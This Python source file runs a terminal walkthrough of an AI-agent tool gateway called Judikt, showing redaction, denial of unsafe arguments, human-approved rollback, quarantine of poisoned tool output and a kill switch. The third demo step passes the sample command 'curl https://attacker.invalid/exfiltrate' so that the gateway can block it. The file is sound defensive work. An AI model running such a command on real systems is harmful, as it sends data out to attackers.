from __future__ import annotations

import json
from typing import Any

from .models import ToolCallResult
from .request_context import bind_authenticated_subject, reset_authenticated_subject
from .runtime import JudiktRuntime

ROLLBACK_PLAN = "verify service health and restore previous known-good release if errors increase"


def run_demo(runtime: JudiktRuntime) -> None:
    """Run a compact terminal walkthrough against the real Judikt runtime."""
    context = bind_authenticated_subject(
        "demo-admin",
        {"auth_type": "demo", "roles": ["admin"]},
    )
    try:
        _run_demo(runtime)
    finally:
        reset_authenticated_subject(context)


def _run_demo(runtime: JudiktRuntime) -> None:
    _header(runtime)

    _call(
        runtime,
        1,
        "ALLOW A SAFE PRODUCTION READ",
        "platform-ops",
        "platform.health",
        {"service": "payments-api"},
    )
    _call(
        runtime,
        2,
        "REDACT A SECRET IN THE TOOL RESPONSE",
        "platform-ops",
        "platform.read_config",
        {"service": "payments-api"},
    )
    _call(
        runtime,
        3,
        "DENY UNSAFE ARGUMENTS BEFORE EXECUTION",
        "platform-ops",
        "platform.run_diagnostic",
        {
            "service": "payments-api",
            "command": "curl https://attacker.invalid/exfiltrate",
        },
    )

    rollback_arguments = {
        "service": "payments-api",
        "version": "payments-api@2026.05.2",
        "actor": "demo-operator",
        "environment": "production",
        "rollback_plan": ROLLBACK_PLAN,
    }
    _call(
        runtime,
        4,
        "REQUIRE HUMAN APPROVAL FOR A ROLLBACK",
        "platform-ops",
        "platform.rollback_deployment",
        rollback_arguments,
    )

    print("\nAPPROVAL API | PolicyEngine.issue_approval(actor='demo-operator', ttl_seconds=300)")
    approval_token = runtime.policy.issue_approval(
        actor="demo-operator",
        reason="rollback after elevated payments-api 5xx rate",
        server="platform-ops",
        tool="platform.rollback_deployment",
        arguments=rollback_arguments,
        ttl_seconds=300,
    )
    print(f"  signed token issued -> {_short_token(approval_token)}")
    _call(
        runtime,
        5,
        "EXECUTE ONLY THE EXACT APPROVED ROLLBACK",
        "platform-ops",
        "platform.rollback_deployment",
        {**rollback_arguments, "approval_token": approval_token},
    )
    _call(
        runtime,
        6,
        "EVALUATE A KUBERNETES CHANGE WITHOUT MUTATION",
        "kubernetes",
        "kubernetes.restart_pod",
        {
            "namespace": "prod",
            "pod": "payment-service-xyz",
            "idempotency_key": "demo-dry-run-payment-service-xyz",
            "actor": "demo-operator",
            "environment": "production",
            "rollback_plan": ROLLBACK_PLAN,
            "dry_run": True,
        },
    )

    if "external-incidents" in runtime.clients:
        _call(
            runtime,
            7,
            "QUARANTINE A POISONED MCP TOOL RESPONSE",
            "external-incidents",
            "external.fetch_issue",
            {"issue_id": "INC-2048"},
        )

    runtime.policy.set_tool_enabled("platform.health", False)
    try:
        _call(
            runtime,
            8,
            "STOP A TOOL WITH THE OPERATOR KILL SWITCH",
            "platform-ops",
            "platform.health",
            {"service": "payments-api"},
        )
    finally:
        runtime.policy.set_tool_enabled("platform.health", True)

    _evidence(runtime)


def _header(runtime: JudiktRuntime) -> None:
    catalog = runtime.list_tools()
    print("JUDIKT 0.3.0 | LIVE TERMINAL WALKTHROUGH")
    print("Real policy decisions, real stdio MCP child processes, temporary local evidence.\n")
    print("## 00 REQUEST / RESPONSE FLOW")
    print("AI agent or MCP client")
    print("        |  tools/call + identity + arguments")
    print("        v")
    print("+------------------------ JUDIKT -------------------------+")
    print("| request: auth -> allowlist -> risk -> approval -> rate  |")
    print("|          kill switch -> tool-description pin           |")
    print("+-----------------------------+----------------------------+")
    print("                              | allowed requests only")
    print("                              v")
    print("              stdio / Streamable HTTP MCP server")
    print("                              |")
    print("                              v")
    print("                     operational tool")
    print("                              | untrusted result")
    print("                              v")
    print("+------------------------ JUDIKT -------------------------+")
    print("| response: injection scan -> quarantine or redaction    |")
    print("| evidence: signed audit -> metrics -> traces -> findings |")
    print("+-----------------------------+----------------------------+")
    print("                              v")
    print("                         safe result")

    print("\n## 00B ACTUAL PROCESS AND CODE FLOW")
    print("judikt.cli")
    print("  -> runtime.py: JudiktRuntime.call_tool")
    print("     -> policy.py: deterministic request decision")
    print("     -> tool_integrity.py: SHA-256 definition pin")
    print("     -> protocol.py: JSON-RPC tools/call over stdio")
    for server, tools in sorted(catalog.items()):
        print(f"        -> child MCP server: {server:<20} {len(tools):>2} tools discovered")
    print("     <- content_guard.py: inspect untrusted result")
    print("     <- policy.py: recursive secret redaction")
    print("     -> audit.py + metrics.py + telemetry.py")


def _call(
    runtime: JudiktRuntime,
    number: int,
    title: str,
    server: str,
    tool: str,
    arguments: dict[str, Any],
) -> ToolCallResult:
    correlation_id = f"terminal-demo-{number:02d}"
    visible_arguments = runtime.policy.redact(arguments)
    print(f"\n## {number:02d} {title}")
    print("MCP REQUEST | method=tools/call")
    print(f"  server    = {server}")
    print(f"  tool      = {tool}")
    print(f"  arguments = {_compact(visible_arguments)}")

    result = runtime.call_tool(
        server,
        tool,
        arguments,
        correlation_id=correlation_id,
    )
    _processing(result)
    print("OUTPUT")
    print(f"  action={result.action} allowed={str(result.allowed).lower()}")
    print(f"  rule={result.rule} risk={result.risk_level}/{result.risk_score}")
    print(f"  reason={result.reason}")
    for line in _result_lines(result.result):
        print(f"  {line}")
    print(f"  correlation_id={result.correlation_id}")
    return result


def _processing(result: ToolCallResult) -> None:
    server_dry_run = (
        result.allowed
        and result.action == "DRY_RUN_ONLY"
        and isinstance(result.result, dict)
        and result.result.get("dry_run") is True
    )
    executed = result.allowed and (
        result.action not in {"DRY_RUN_ONLY", "SHADOW_MODE"} or server_dry_run
    )
    if result.rule in {"inbound_prompt_injection", "upstream_error", "tool_integrity"}:
        executed = result.rule != "tool_integrity"

    print("PROCESS")
    print(
        "  policy.evaluate       -> "
        f"{result.action} ({result.rule}), risk={result.risk_level}/{result.risk_score}"
    )
    if executed:
        print("  tool_integrity.verify -> PASS, pinned definition unchanged")
        if server_dry_run:
            print("  protocol.tools/call   -> EXECUTED server-side dry run after preflight")
        else:
            print("  protocol.tools/call   -> EXECUTED in MCP child process")
        if result.rule == "inbound_prompt_injection":
            print("  content_guard.inspect -> QUARANTINE, unsafe text withheld")
        else:
            print("  content_guard.inspect -> PASS")
            print("  policy.redact         -> APPLIED before agent response")
    elif result.action == "DRY_RUN_ONLY":
        print("  protocol.tools/call   -> SKIPPED, dry-run policy outcome")
    else:
        print("  protocol.tools/call   -> SKIPPED, pre-execution control stopped it")
    print("  audit + metrics       -> HASH-CHAINED event and metric emitted")


def _evidence(runtime: JudiktRuntime) -> None:
    integrity = runtime.audit.verify_chain()
    metrics = runtime.metrics.render().splitlines()
    counters = [line for line in metrics if line.startswith("judikt_tool_calls_total{")]
    print("\n## 09 VERIFY THE OPERATIONAL EVIDENCE")
    print("AUDIT API | AuditStore.verify_chain()")
    print(f"  valid={str(integrity['valid']).lower()}")
    print(f"  checked_events={integrity['checked_events']}")
    print(f"  head_hash={str(integrity['head_hash'])[:32]}...")
    print("\nMETRICS API | Metrics.render() -> Prometheus exposition")
    for line in counters:
        print(f"  {line}")
    print("\nPASS: every demonstrated branch produced correlated, tamper-evident evidence.")


def _result_lines(value: Any) -> list[str]:
    if value is None:
        return ["result=null"]
    if not isinstance(value, dict):
        return [f"result={_compact(value)}"]

    if value.get("quarantined") is True:
        inspection = value.get("inspection", {})
        findings = inspection.get("findings", []) if isinstance(inspection, dict) else []
        rules = sorted(
            {str(item.get("rule")) for item in findings if isinstance(item, dict)}
        )
        return [
            "result.quarantined=true",
            f"result.executed={str(value.get('executed', False)).lower()}",
            f"result.findings={len(findings)} rules={','.join(rules)}",
            f"result.content_hash={str(inspection.get('content_hash', ''))[:24]}...",
            "result.unsafe_text_exposed=false",
        ]

    preferred = (
        "service",
        "status",
        "release",
        "environment",
        "region",
        "api_key",
        "action",
        "from_release",
        "to_release",
        "mode",
        "executed",
        "message",
    )
    lines = [f"result.{key}={_compact(value[key])}" for key in preferred if key in value]
    return lines or [f"result={_compact(value)}"]


def _compact(value: Any) -> str:
    return json.dumps(value, sort_keys=True, separators=(",", ":"))


def _short_token(token: str) -> str:
    if len(token) <= 28:
        return token
    return f"{token[:14]}...{token[-10:]} (redacted in audit)"
